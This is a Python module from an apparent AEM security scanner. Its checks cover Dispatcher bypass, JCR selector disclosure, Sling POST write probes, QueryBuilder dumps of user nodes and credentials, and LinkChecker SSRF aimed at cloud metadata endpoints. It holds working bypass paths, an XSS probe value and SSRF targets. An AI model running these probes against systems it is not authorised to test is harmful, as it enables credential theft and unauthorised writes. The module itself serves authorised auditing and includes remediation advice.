"""
Advanced Bypass & Logic-Heavy Checks
=====================================
Implements:
  AEM-DISP-002  Advanced Dispatcher Bypass (semicolon, double-slash, encoding,
                 nested paths, selector manipulation)
  AEM-SEL-001   Selector Manipulation (info-disclosure via .json, .infinity.json, etc.)
  AEM-SLING-001 Sling POST Servlet unauthorized write probe
  AEM-QB-001    QueryBuilder JCR property dump
  AEM-SSRF-001  LinkChecker Out-of-Band SSRF
"""
from __future__ import annotations

import concurrent.futures
import uuid
from typing import List, Optional, Tuple

from .base import Check, CheckContext, CheckOutcome
from ..models import ActionArtifact, Evidence, Finding
from ..response_analysis import analyse_response, ResponseTierAnalysis, tier_finding_rationale


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _ev(
    url: str,
    status: Optional[int],
    response_hash: str,
    text: str,
    rationale: str,
) -> Evidence:
    return Evidence(
        endpoint=url,
        status_code=status,
        response_hash=response_hash,
        snippet=(text or "")[:200].replace("\n", " "),
        rationale=rationale,
    )


# ---------------------------------------------------------------------------
# AEM-DISP-002 — Advanced Dispatcher Bypass
# ---------------------------------------------------------------------------

# Sensitive paths that should be blocked by a well-configured Dispatcher.
_SENSITIVE_BASELINE_PATHS = [
    "/system/console",
    "/crx/de",
    "/crx/packmgr",
    "/bin/querybuilder.json",
    "/etc/replication",
    "/libs/granite/core/content/login.html",
]

# Bypass technique templates.  {path} will be replaced with each sensitive path.
_BYPASS_TEMPLATES: List[Tuple[str, str]] = [
    # Technique, pattern
    ("semicolon-dotdot",        "/content/..;{path}"),
    ("double-slash",            "/{path}"),         # path already starts with /
    ("double-slash-2",          "//{path[1:]}"),    # strip leading / then double
    ("trailing-semicolon",      "{path};"),
    ("encoded-dot",             "{path}.%2e"),
    ("encoded-slash-mid",       "{first}%2f{rest}"),
    ("double-encoded-slash",    "{first}%252f{rest}"),
    ("null-byte",               "{path}%00.html"),
    ("cr-injection",            "{path}%0a"),
    ("tab-injection",           "{path}%09"),
    ("nested-content",          "/content/dam/..;{path}"),
    ("nested-etc",              "/etc/..;{path}"),
    ("nested-libs",             "/libs/..;{path}"),
    ("encoded-semicolon",       "/content/..%3b{path}"),
]


def _build_bypass_variants(base_path: str) -> List[Tuple[str, str, str]]:
    """
    Returns list of (technique, variant_path, baseline_path) tuples.
    """
    variants: List[Tuple[str, str, str]] = []

    # Split path for partial encoding techniques
    parts = base_path.lstrip("/").split("/", 1)
    first = "/" + parts[0]
    rest = parts[1] if len(parts) > 1 else ""

    for technique, tmpl in _BYPASS_TEMPLATES:
        try:
            if tmpl == "/{path}":
                variant = "/" + base_path.lstrip("/")
            elif tmpl == "//{path[1:]}":
                variant = "//" + base_path.lstrip("/")
            elif "{first}" in tmpl and "{rest}" in tmpl:
                if not rest:
                    continue
                variant = tmpl.format(first=first, rest=rest)
            else:
                variant = tmpl.format(path=base_path)
            variants.append((technique, variant, base_path))
        except (KeyError, IndexError):
            continue

    return variants


class AdvancedDispatcherBypassCheck(Check):
    check_id = "AEM-DISP-002"
    name = "advanced-dispatcher-bypass"
    tags = ["dispatcher", "bypass", "encoding", "semicolon", "traversal"]
    profiles = ["standard", "deep", "authenticated-deep"]

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        # First: collect baselines
        baselines: dict[str, Optional[int]] = {}
        baseline_analyses: dict[str, ResponseTierAnalysis] = {}

        for base_path in _SENSITIVE_BASELINE_PATHS:
            result = ctx.client.request("GET", base_path)
            if result.error:
                continue
            baselines[base_path] = result.status_code
            baseline_analyses[base_path] = analyse_response(result)

        if not baselines:
            return CheckOutcome(findings=[], artifacts=[])

        # Emit a tier-analysis info finding if any baseline shows edge blocking.
        for base_path, analysis in baseline_analyses.items():
            if analysis.is_edge_blocked and analysis.edge_confidence >= 60:
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title=f"Dispatcher/WAF blocking confirmed for {base_path}",
                        severity="info",
                        category="dispatcher",
                        evidence=_ev(
                            url=base_path,
                            status=analysis.status_code,
                            response_hash="-",
                            text=analysis.rationale,
                            rationale=tier_finding_rationale(analysis),
                        ),
                        recommendation="; ".join(analysis.recommendations) or
                            "Edge layer confirmed; prioritise bypass variant probing.",
                    )
                )

        # Collect all (technique, variant, base_path) tuples
        probe_list: List[Tuple[str, str, str]] = []
        for base_path in baselines:
            probe_list.extend(_build_bypass_variants(base_path))

        def probe(item: Tuple[str, str, str]):
            technique, variant, base_path = item
            result = ctx.client.request("GET", variant)
            return item, result

        with concurrent.futures.ThreadPoolExecutor(max_workers=ctx.config.workers) as pool:
            futures = [pool.submit(probe, item) for item in probe_list]
            for future in concurrent.futures.as_completed(futures):
                item, result = future.result()
                technique, variant, base_path = item

                if result.error:
                    continue

                baseline_code = baselines.get(base_path)
                analysis = analyse_response(result)

                # Flag when variant is more permissive than baseline
                bypass_hit = (
                    result.status_code in (200, 401, 403)
                    and baseline_code in (404, 400, None)
                ) or (
                    result.status_code == 200
                    and baseline_code in (401, 403)
                )

                if bypass_hit:
                    sev = "critical" if result.status_code == 200 else "high"
                    findings.append(
                        Finding(
                            check_id=self.check_id,
                            title=f"Dispatcher bypass via {technique}: {base_path}",
                            severity=sev,
                            category="dispatcher",
                            evidence=_ev(
                                url=result.url,
                                status=result.status_code,
                                response_hash=result.response_hash,
                                text=result.text,
                                rationale=(
                                    f"Technique '{technique}' returned HTTP {result.status_code} "
                                    f"while baseline {base_path} returned {baseline_code}. "
                                    + tier_finding_rationale(analysis)
                                ),
                            ),
                            recommendation=(
                                f"Patch Dispatcher normalization rules to reject '{technique}' "
                                f"encoded variants. Validate rewrite rules, mod_rewrite, and "
                                f"allowedClients. Apply CSH-6.3.3.1+ or equivalent hotfix."
                            ),
                        )
                    )

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-SEL-001 — Selector Manipulation
# ---------------------------------------------------------------------------

_SELECTOR_TARGETS = [
    "/content",
    "/home/users",
    "/home/groups",
    "/etc",
    "/var",
    "/bin",
    "/libs/granite/core/content/login",
    "/libs/cq/core/content/welcome",
    "/etc/replication/agents.author",
    "/etc/replication/agents.publish",
    "/etc/cloudservices",
    "/etc/designs",
    "/content/dam",
    "/content/usergenerated",
]

_SELECTORS = [
    ".json",
    ".xml",
    ".tidy.json",
    ".infinity.json",
    ".-1.json",
    ".10.json",
    ".jsonp",
    ".html.json",
    ".jcr:content.json",
    "/_jcr_content.json",
    "/.json",
]


class SelectorManipulationCheck(Check):
    check_id = "AEM-SEL-001"
    name = "selector-bypass"
    tags = ["selector", "json", "sling", "info-disclosure", "dispatcher"]
    profiles = ["standard", "deep", "authenticated-deep"]

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        probe_list: List[Tuple[str, str]] = [
            (target + selector, selector)
            for target in _SELECTOR_TARGETS
            for selector in _SELECTORS
        ]

        def probe(item: Tuple[str, str]):
            path, selector = item
            result = ctx.client.request("GET", path)
            return path, selector, result

        with concurrent.futures.ThreadPoolExecutor(max_workers=ctx.config.workers) as pool:
            futures = [pool.submit(probe, item) for item in probe_list]
            for future in concurrent.futures.as_completed(futures):
                path, selector, result = future.result()
                if result.error or result.status_code not in (200, 201):
                    continue

                analysis = analyse_response(result)
                # Interesting only if the response looks like it came from Sling (JSON/XML content)
                ct = result.headers.get("content-type", "").lower()
                body = result.text or ""
                is_json_xml = (
                    "json" in ct
                    or "xml" in ct
                    or body.lstrip().startswith("{")
                    or body.lstrip().startswith("<")
                )
                has_jcr = any(m in body for m in ("jcr:", "sling:", "cq:", ":jcr"))

                if not (is_json_xml or has_jcr):
                    continue

                sev = "high" if has_jcr else "medium"
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title=f"JCR/Sling data exposed via selector '{selector}' on {path}",
                        severity=sev,
                        category="selector_bypass",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            response_hash=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"Selector '{selector}' triggered Sling's DefaultGetServlet and returned "
                                f"JSON/XML content (content-type={ct}). JCR markers in body: {has_jcr}. "
                                + tier_finding_rationale(analysis)
                            ),
                        ),
                        recommendation=(
                            "Configure the Dispatcher to deny requests containing file extension selectors "
                            "on internal paths. Apply the following Dispatcher rule: "
                            "/0099 { /type 'deny' /url '*.json' } for paths that should not expose JCR data."
                        ),
                    )
                )

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-SLING-001 — Sling POST Servlet Unauthorized Write
# ---------------------------------------------------------------------------

_SLING_WRITE_TARGETS = [
    "/content/usergenerated",
    "/content/dam",
    "/content",
    "/var",
    "/tmp",
]


class SlingPostServletCheck(Check):
    check_id = "AEM-SLING-001"
    name = "sling-post"
    tags = ["sling", "sling-post", "write", "active"]
    profiles = ["deep", "authenticated-deep"]
    active = True
    state_changing = True  # POSTs nodes to /content/, /etc/, etc.

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []
        artifacts: List[ActionArtifact] = []

        probe_id = f"aem-probe-{uuid.uuid4().hex[:8]}"

        for target_base in _SLING_WRITE_TARGETS:
            node_path = f"{target_base}/{probe_id}"

            # Probe 1: attempt write
            write_resp = ctx.client.request(
                "POST",
                node_path,
                data={
                    "jcr:primaryType": "nt:unstructured",
                    "aem_audit_marker": "WRITE_PROBE",
                    "probe_id": probe_id,
                    "message": "<img src=x onerror=alert(1)>",  # benign XSS probe value
                },
            )

            if write_resp.error:
                continue

            created = write_resp.status_code in (200, 201, 204)

            if write_resp.status_code in (200, 201, 204, 403, 401):
                sev = "critical" if created else "medium"
                analysis = analyse_response(write_resp)
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title=(
                            f"Sling POST servlet allows unauthenticated write to {target_base}"
                            if created else
                            f"Sling POST servlet reachable at {target_base} (denied: {write_resp.status_code})"
                        ),
                        severity=sev,
                        category="sling_post",
                        evidence=_ev(
                            url=write_resp.url,
                            status=write_resp.status_code,
                            response_hash=write_resp.response_hash,
                            text=write_resp.text,
                            rationale=(
                                f"POST to {node_path} returned HTTP {write_resp.status_code}. "
                                f"write_succeeded={created}. "
                                + tier_finding_rationale(analysis)
                            ),
                        ),
                        recommendation=(
                            "Deny unauthenticated POST requests to /content/usergenerated and /content/dam "
                            "via Dispatcher rules and granite:Deny ACL entries on nt:unstructured creation."
                        ),
                        state_changing=created,
                    )
                )

            # Cleanup
            if created:
                del_resp = ctx.client.request(
                    "POST", node_path, data={":operation": "delete"}
                )
                cleanup_ok = del_resp.status_code in (200, 201, 204) and not del_resp.error
                artifacts.append(
                    ActionArtifact(
                        action_id=f"AEM-SLING-CLEANUP-{target_base.replace('/', '_')}",
                        description=f"Write probe node created at {node_path}",
                        artifact_path=node_path,
                        cleanup_attempted=True,
                        cleanup_success=cleanup_ok,
                        notes=del_resp.error or f"delete_status={del_resp.status_code}",
                    )
                )

            # Probe 2: read-back after write attempt
            read_resp = ctx.client.request("GET", node_path + ".json")
            if not read_resp.error and read_resp.status_code == 200 and probe_id in (read_resp.text or ""):
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title=f"Write confirmed: probe node readable via .json selector at {target_base}",
                        severity="critical",
                        category="sling_post",
                        evidence=_ev(
                            url=read_resp.url,
                            status=read_resp.status_code,
                            response_hash=read_resp.response_hash,
                            text=read_resp.text,
                            rationale=(
                                f"Probe node {node_path} was readable after write, confirming persistent "
                                f"JCR node creation. XSS payload was stored. probe_id={probe_id}."
                            ),
                        ),
                        recommendation=(
                            "Immediately remove probe nodes. Apply Dispatcher deny rules for POST to "
                            "/content/usergenerated and /content/dam. Enable CSRF token enforcement."
                        ),
                        state_changing=True,
                    )
                )

        return CheckOutcome(findings=findings, artifacts=artifacts)


# ---------------------------------------------------------------------------
# AEM-QB-001 — QueryBuilder JCR Dump
# ---------------------------------------------------------------------------

_QB_PAYLOADS: List[Tuple[str, str, str]] = [
    # (label, url, rationale)
    (
        "user_nodes",
        "/bin/querybuilder.json?path=/home/users&type=rep:User&p.limit=10&p.hits=full",
        "Dumps user nodes including potential password hashes.",
    ),
    (
        "group_nodes",
        "/bin/querybuilder.json?path=/home/groups&type=rep:Group&p.limit=10&p.hits=full",
        "Enumerates repository groups and their members.",
    ),
    (
        "osgi_configs",
        "/bin/querybuilder.json?path=/apps&type=sling:OsgiConfig&p.limit=10&p.hits=full",
        "Dumps OSGi config nodes that may include credentials or API keys.",
    ),
    (
        "content_dump",
        "/bin/querybuilder.json?path=/content&type=nt:unstructured&p.limit=5&p.hits=full",
        "Generic content node dump to verify read access to JCR.",
    ),
    (
        "dam_assets",
        "/bin/querybuilder.json?path=/content/dam&type=dam:Asset&p.limit=5&p.hits=full&property=jcr:mimeType&property.value=text/plain",
        "Lists plain-text DAM assets that may contain sensitive data.",
    ),
    (
        "replication_agents",
        "/bin/querybuilder.json?path=/etc/replication&type=cq:Page&p.limit=10&p.hits=full",
        "Dumps replication agent configuration pages.",
    ),
    (
        "cloud_configs",
        "/bin/querybuilder.json?path=/etc/cloudservices&type=cq:PageContent&p.limit=10&p.hits=full",
        "Lists cloud service configs that may expose credentials.",
    ),
    (
        "bypass_variant",
        "/bin/querybuilder.json%3Bpath=/home/users&type=rep:User&p.limit=5&p.hits=full",
        "Semicolon bypass variant to evade dispatcher path filtering on querybuilder.",
    ),
]


class QueryBuilderDumpCheck(Check):
    check_id = "AEM-QB-001"
    name = "querybuilder-dump"
    tags = ["querybuilder", "jcr", "info-disclosure", "sling"]
    profiles = ["standard", "deep", "authenticated-deep"]

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        def probe(item: Tuple[str, str, str]):
            label, url, rationale = item
            result = ctx.client.request("GET", url)
            return label, url, rationale, result

        with concurrent.futures.ThreadPoolExecutor(max_workers=ctx.config.workers) as pool:
            futures = [pool.submit(probe, item) for item in _QB_PAYLOADS]
            for future in concurrent.futures.as_completed(futures):
                label, url, base_rationale, result = future.result()
                if result.error:
                    continue
                if result.status_code not in (200, 201):
                    continue

                body = result.text or ""
                analysis = analyse_response(result)

                # Assess richness: any JCR data returned?
                has_jcr = any(m in body for m in ("jcr:", "rep:", "sling:", ":jcr", "granite"))
                has_password = any(m in body.lower() for m in ("password", "rep:password", "passwd", "secret", "apikey", "api_key", "credential"))

                sev = "critical" if has_password else ("high" if has_jcr else "medium")
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title=f"QueryBuilder accessible — {label} endpoint returned HTTP 200",
                        severity=sev,
                        category="querybuilder_dump",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            response_hash=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"{base_rationale} JCR markers in body: {has_jcr}. "
                                f"Potential credential fields: {has_password}. "
                                + tier_finding_rationale(analysis)
                            ),
                        ),
                        recommendation=(
                            "Restrict /bin/querybuilder.json access to authenticated author requests. "
                            "Apply Dispatcher filter: /0100 { /type 'deny' /url '/bin/querybuilder*' }. "
                            "Review OSGi configs for inline credentials."
                        ),
                    )
                )

        return CheckOutcome(findings=findings, artifacts=[])


# ---------------------------------------------------------------------------
# AEM-SSRF-001 — LinkChecker Out-of-Band SSRF
# ---------------------------------------------------------------------------

_LINKCHECKER_PATHS = [
    "/etc/linkchecker.html",
    "/etc/linkchecker",
    "/libs/cq/linkchecker/content/linkchecker.html",
    # Bypass variants
    "/etc/..;/etc/linkchecker.html",
    "/content/..;/etc/linkchecker.html",
]

_CLOUD_METADATA_ENDPOINTS = [
    "http://169.254.169.254/latest/meta-data/",               # AWS IMDSv1
    "http://169.254.169.254/metadata/v1/",                    # DigitalOcean
    "http://metadata.google.internal/computeMetadata/v1/",    # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://100.100.100.200/latest/meta-data/",               # Alibaba Cloud
]


class LinkCheckerSSRFCheck(Check):
    check_id = "AEM-SSRF-001"
    name = "linkchecker-ssrf"
    tags = ["ssrf", "linkchecker", "oob", "active"]
    profiles = ["deep", "authenticated-deep"]
    active = True

    def run(self, ctx: CheckContext) -> CheckOutcome:
        findings: List[Finding] = []

        oob_collector = getattr(ctx.config, "oob_collector", None)

        # Step 1: Discover which linkchecker paths are reachable
        reachable: List[str] = []
        for path in _LINKCHECKER_PATHS:
            result = ctx.client.request("GET", path)
            if result.error:
                continue
            if result.status_code in (200, 302, 301):
                reachable.append(path)
                analysis = analyse_response(result)
                findings.append(
                    Finding(
                        check_id=self.check_id,
                        title=f"LinkChecker endpoint reachable: {path}",
                        severity="high",
                        category="linkchecker",
                        evidence=_ev(
                            url=result.url,
                            status=result.status_code,
                            response_hash=result.response_hash,
                            text=result.text,
                            rationale=(
                                f"LinkChecker at {path} returned HTTP {result.status_code}. "
                                "This endpoint accepts URLs and makes server-side HTTP requests — "
                                "classic SSRF vector. " + tier_finding_rationale(analysis)
                            ),
                        ),
                        recommendation=(
                            "Restrict /etc/linkchecker.html with Dispatcher filter: "
                            "/0101 { /type 'deny' /url '/etc/linkchecker*' }. "
                            "If needed, apply allowlist for internal targets only."
                        ),
                    )
                )

        if not reachable:
            return CheckOutcome(findings=findings, artifacts=[])

        # Step 2: Issue SSRF probes
        ssrf_targets: List[str] = []
        if oob_collector:
            ssrf_targets.append(oob_collector)
        ssrf_targets.extend(_CLOUD_METADATA_ENDPOINTS)

        for lc_path in reachable:
            for ssrf_url in ssrf_targets:
                post_resp = ctx.client.request(
                    "POST",
                    lc_path,
                    data={
                        "link": ssrf_url,
                        "_charset_": "utf-8",
                    },
                )
                if post_resp.error:
                    continue

                body = post_resp.text or ""
                analysis = analyse_response(post_resp)

                # Signals of successful SSRF response
                metadata_keywords = [
                    "ami-id", "instance-id", "hostname", "security-credentials",
                    "computeMetadata", "serviceAccounts", "access_token",
                    "privateIpAddress", "macAddress",
                ]
                oob_hit = oob_collector and oob_collector in body
                metadata_hit = any(kw in body for kw in metadata_keywords)
                
                if post_resp.status_code in (200, 201) and (oob_hit or metadata_hit or len(body) > 50):
                    sev = "critical" if (metadata_hit or oob_hit) else "high"
                    findings.append(
                        Finding(
                            check_id=self.check_id,
                            title=f"SSRF confirmed via LinkChecker POST to {ssrf_url[:60]}",
                            severity=sev,
                            category="ssrf",
                            evidence=_ev(
                                url=post_resp.url,
                                status=post_resp.status_code,
                                response_hash=post_resp.response_hash,
                                text=post_resp.text,
                                rationale=(
                                    f"POST to {lc_path} with link={ssrf_url} returned HTTP "
                                    f"{post_resp.status_code}. OOB hit: {oob_hit}. "
                                    f"Metadata keywords in body: {metadata_hit}. "
                                    + tier_finding_rationale(analysis)
                                ),
                            ),
                            recommendation=(
                                "Block the LinkChecker endpoint at the Dispatcher. "
                                "If SSRF to cloud metadata is confirmed, rotate ALL IAM/service account credentials "
                                "immediately. Enable IMDSv2 (for AWS) or set metadata server hop limits."
                            ),
                            state_changing=False,
                        )
                    )

        return CheckOutcome(findings=findings, artifacts=[])
